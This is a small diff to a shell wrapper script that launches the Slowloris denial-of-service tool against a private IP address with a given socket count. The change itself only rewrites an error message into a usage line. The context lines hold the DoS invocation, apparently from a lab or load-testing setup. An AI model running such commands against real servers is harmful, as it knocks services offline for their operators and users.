@@ -11,5 +11,5 @@ then
         sudo python3 slowloris.py 10.1.5.2 --sockets $1 > /dev/null
     fi
 else
-    echo "YOU NEED TO SPECIFY SOCKS"
+    echo "Usage: ./slowloris.sh <SOCKS>"
 fi
